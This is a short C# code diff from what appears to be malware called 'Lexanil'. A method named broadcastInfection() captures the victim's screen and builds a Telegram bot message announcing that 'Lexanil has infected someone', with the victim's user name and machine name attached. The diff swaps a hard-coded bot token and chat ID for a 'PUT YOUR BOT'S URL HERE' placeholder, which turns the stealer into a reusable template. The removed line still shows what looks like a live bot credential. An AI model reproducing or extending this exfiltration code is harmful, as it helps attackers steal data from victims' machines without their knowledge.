@@ -159,7 +159,7 @@ namespace Lexanil
         private void broadcastInfection()
         {
             CaptureScreen();
-            string url = $"https://api.telegram.org/bot1991257214:AAHecknMxCKd24uX8wNC5g5AYahRLlUSCVs/sendMessage?chat_id=-561001723&text=" +
+            string url = $"PUT YOUR BOT'S URL HERE" +
                 $"😈 {AppDomain.CurrentDomain.FriendlyName}(Lexanil™) Has infected Someone, I'm sending you his details! 😈\n" +
                 $"User Name: {Environment.UserName}\n\n" +
                 $"Machine Name: {Environment.MachineName}\n\n" +
